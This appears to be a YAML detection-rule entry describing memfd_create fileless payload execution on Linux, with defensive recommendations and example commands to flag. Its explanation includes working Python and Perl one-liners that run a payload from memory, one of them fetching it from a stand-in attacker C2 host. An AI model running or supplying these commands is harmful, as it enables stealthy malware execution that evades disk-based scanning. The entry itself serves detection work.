id: "persistence-evasion/fileless-execution/memfd-create"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Fileless Execution"
category_id: "6.9"
name: "memfd_create Fileless Payload Execution"
risk_level: "critical"

abstract: |
  Using the memfd_create syscall to create anonymous in-memory file descriptors for
  payload execution with zero disk artifacts. This APT-grade technique creates an
  executable memory region that appears nowhere in the filesystem and survives only
  until process termination.

explanation: |
  memfd_create() creates an anonymous file descriptor backed by anonymous memory, not
  the filesystem. The resulting fd can hold an ELF binary that is then executed via
  fexecve(), leaving no trace on disk:

  ```
  python3 -c "import ctypes,os; fd=ctypes.CDLL(None).memfd_create('',0); os.write(fd,open('/tmp/p').read()); os.fexecve(fd,[b'x'],os.environ)"
  perl -e 'use POSIX; my $fd = syscall(319,"",1); open(my $fh,">&=", $fd); print $fh $payload; exec {"/proc/$$/fd/$fd"} "x"'
  ```

  In practice, the payload is typically fetched from the network:
  ```
  python3 -c "
  import ctypes, os, urllib.request
  fd = ctypes.CDLL(None).memfd_create('', 1)
  data = urllib.request.urlopen('https://c2.attacker.com/payload').read()
  os.write(fd, data)
  os.fexecve(fd, [b'proc'], {})
  "
  ```

  Properties that make this APT-grade:
  - No file written to disk at any point
  - `/proc/<pid>/exe` shows a memfd path like `memfd:name (deleted)`
  - No file creation events in auditd
  - Standard AV/EDR file scanning never sees the payload
  - Survives as long as the process runs; disappears completely on exit

  Exposed via Python (ctypes.CDLL(None).memfd_create), Perl (syscall(319)), C,
  and Go via golang.org/x/sys/unix.

recommendation: |
  - Block python/perl/ruby invocations containing memfd_create patterns.
  - Use seccomp to deny the memfd_create syscall (syscall 319 on x86_64).
  - Monitor for processes with /proc/PID/exe pointing to memfd paths.
  - Use eBPF-based runtime security tools that can intercept syscall-level execution.

examples:
  bad:
    - "python3 -c \"import ctypes; fd=ctypes.CDLL(None).memfd_create('',0)\""
    - "perl -e 'syscall(319,\"\",1)'"
    - "python3 -c \"import ctypes,os; fd=ctypes.CDLL(None).memfd_create('x',0); os.write(fd,open('/tmp/p','rb').read()); os.fexecve(fd,[b'x'],{})\""
  good:
    - "python3 -c \"import os; print(os.getpid())\""
    - "python3 script.py"

